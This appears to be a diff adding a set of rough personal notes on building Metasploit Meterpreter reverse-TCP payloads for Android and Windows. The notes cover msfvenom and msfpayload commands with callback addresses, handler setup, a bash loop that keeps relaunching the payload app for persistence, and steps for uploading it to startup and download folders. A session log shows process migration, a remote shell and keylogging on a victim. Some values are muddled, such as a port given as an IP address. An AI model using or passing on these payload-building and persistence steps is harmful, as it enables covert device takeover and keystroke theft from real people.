@@ -1,0 +1,84 @@
+﻿COMMANDS: Example being used (Android Meterpreter)
+
+msfvenom -p android/meterpreter/reverse_tcp  LHOST=111.94.141.101 LPORT=192.168.1.106 R> name.apk
+In Metasploit:
+use multi/handler
+set payload android/meterpreter/reverse_tcp
+set LHOST “private IP address”
+set LPORT “forwarded port”
+run
+
+/msfpayload windows/meterpreter/reverse_tcp LHOST=”your local ip” LPORT=”any port you wish” x > /root/reverse_tcp.exe
+
+Options: LHOST=192.168.255.130,LPORT=4444
+msf > use exploit/multi/handler
+msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp
+PAYLOAD => windows/meterpreter/reverse_tcp
+msf exploit(handler) > set LHOST 192.168.255.130
+msfpayload android/meterpreter/reverse_tcp LHOST=182.68.42.6 R > /root/abcde.apk
+msfconsole
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set LHOST 192.168.0.4
+exploit
+
+==================
+#!/bin/bash
+while true
+do am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity
+sleep 20
+done
+===================anything.sh
+
+Move/Copy this to the Home/Root folder of KALI.
+
+==================
+#!/bin/bash
+while :
+do am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity
+sleep 20
+done
+==================
+LHOST => 192.168.255.130
+msf exploit(handler) > set LPORT 4444
+LPORT => 4444
+msf exploit(handler) > exploit
+meterpreter > ps
+Search for explorer.exe and migrate to the process
+meterpreter > migrate 5716
+[*] Migrating to 5716...
+[*] Migration completed successfully.
+meterpreter >
+meterpreter > use priv
+Keylogger activity on victim, just type keyscan_start
+meterpreter > shell
+Process 5428 created.
+Channel 1 created.
+Microsoft Windows [Version 6.1.7600]
+Copyright (c) 2009 Microsoft Corporation. All rights reserved.
+C:\Windows\system32>
+C:\Windows\system32>whoami
+whoami
+win7-pc\win 7
+C:\Windows\system32>
+meterpreter > keyscan_dump
+
+cd /
+ls
+cd etc
+ls
+cd init.d
+ls
+upload anything.sh
+cd /
+cd /sdcard/Download
+ls
+upload anything.sh
+shell
+cd /
+cd /sdcard/Download
+ls
+sh anything.sh
+
+keyscan__start
+keyscan__dump
